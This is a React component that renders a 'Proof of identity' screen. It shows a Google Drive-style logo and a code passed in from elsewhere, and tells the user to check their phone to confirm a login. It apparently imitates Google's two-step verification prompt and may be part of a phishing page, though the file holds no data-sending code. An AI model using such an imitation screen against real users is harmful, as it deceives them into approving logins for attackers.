import { Dispatch, FC, FormEvent, SetStateAction, useState } from "react";
import styles from "./FormMsg.module.css";
import { MouseEvent } from "react";

interface FormPassProps {
  code: string;
  setWhichForm: Dispatch<SetStateAction<string>>;
}

export const dynamic = "force-dynamic";
export const fetchCache = "force-no-store";

const FormPass: FC<FormPassProps> = ({ setWhichForm, code }) => {
  const handleClick = async (event: MouseEvent<HTMLSpanElement>) => {
    setWhichForm("msg");
  };
  return (
    <div className="box">
      <div className="contain">
        <div className="logo">
          <svg
            className="im"
            xmlns="http://www.w3.org/2000/svg"
            x="0px"
            y="0px"
            width="60"
            height="60"
            viewBox="0 0 48 48"
          >
            <path fill="#FFC107" d="M17 6L31 6 45 30 31 30z"></path>
            <path fill="#1976D2" d="M9.875 42L16.938 30 45 30 38 42z"></path>
            <path fill="#4CAF50" d="M3 30.125L9.875 42 24 18 17 6z"></path>
          </svg>
        </div>
        <div className="info">
          <h2>Proof of identity</h2>

          <h3 className="num">{code}</h3>

          <p>
            Please prove that you are the one trying to log in. Check your phone
          </p>
          <p>A message has just been sent to you</p>
          <span className="for">
            {" "}
            <span onClick={handleClick}>Use another method</span>
          </span>
        </div>
        <div className="footer"></div>
      </div>
    </div>
  );
};
export default FormPass;
